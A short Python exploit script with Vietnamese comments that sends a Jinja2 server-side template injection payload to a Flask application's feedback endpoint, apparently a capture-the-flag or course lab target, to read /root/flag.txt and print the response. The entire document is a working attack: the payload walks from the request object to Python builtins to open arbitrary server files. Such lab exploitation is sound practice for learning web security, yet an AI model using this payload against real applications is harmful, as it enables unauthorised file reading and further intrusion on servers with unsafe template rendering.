import requests

# URL của ứng dụng Flask
url = "https://bef1bbeb-2d7b-4a70-8554-7dad938bef29-app.web.lms.itmo.xyz/feedback"

# Tham số chứa payload
params = {
    "content": "{{ request.application.__globals__.__builtins__.open('/root/flag.txt').read() }}"
}

# Gửi yêu cầu GET với tham số
response = requests.get(url, params=params)

# In ra phản hồi từ server (nếu có)
print(response.text)
